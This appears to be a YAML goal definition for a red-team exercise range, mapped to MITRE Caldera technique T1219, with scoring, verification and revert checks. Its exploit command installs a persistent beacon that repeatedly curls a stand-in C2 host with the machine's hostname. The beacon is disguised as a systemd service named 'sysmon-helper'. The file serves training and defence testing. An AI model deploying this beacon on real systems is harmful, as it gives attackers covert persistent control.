id: install_c2
name: Install C2 Beacon
description: Install a persistent command-and-control beacon that survives reboots, demonstrating full compromise of the target system.
type: goal
difficulty: hard
points: 0
red_points: 500
defend_points: 350
category: command-and-control
tags: [c2, persistence, command-and-control]
conflicts: []
requires: [nopasswd_sudo]

caldera:
  tactic: command-and-control
  technique:
    attack_id: T1219
    name: "Remote Access Software"
  exploit:
    description: "Install a persistent beacon via systemd service"
    command: |
      printf '#!/bin/bash\nwhile true; do\n  curl -sk "http://c2.redteam.local/beacon?host=$(hostname)" || true\n  sleep 300\ndone\n' > /tmp/beacon.sh
      chmod +x /tmp/beacon.sh
      printf '[Unit]\nDescription=System Monitor Helper\nAfter=network.target\n[Service]\nExecStart=/tmp/beacon.sh\nRestart=always\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/sysmon-helper.service
      systemctl daemon-reload && systemctl enable sysmon-helper && systemctl start sysmon-helper && echo "GOAL_ACHIEVED: c2 beacon installed"

verification:
  type: service_running
  service: sysmon-helper
  expected: active

revert_verification:
  type: service_running
  service: sysmon-helper
  expected: inactive
